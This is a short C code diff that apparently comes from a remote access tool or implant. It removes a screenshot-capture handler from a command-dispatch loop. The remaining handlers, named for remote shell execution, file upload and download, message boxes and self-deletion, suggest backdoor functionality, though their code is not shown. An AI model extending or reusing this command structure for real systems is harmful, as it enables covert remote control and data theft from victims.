@@ -5,7 +5,6 @@
 #include "msgbox.h"
 #include "logger.h"
 #include "file.h"
-#include "screenshot.h"
 #include "commander.h"
 #include "return_code.h"
 
@@ -323,21 +322,10 @@ cleanup:
         log_info("Successfully downloaded the file.");
 }
 
-void handle_screenshot()
-{
-    int return_code = 0;
-    return_code = screenshot();
-
-    if (return_code)
-        log_error("Failed to take a screenshot. Error code: %d", return_code);
-    else
-        log_info("Successfully took a screenshot.");
-}
-
 void listen_for_cmds()
 {
     struct cmd cmd = {};
-    void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide, handle_upload_file, handle_download_file, handle_screenshot};
+    void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide, handle_upload_file, handle_download_file};
 
     while (TRUE)
     {
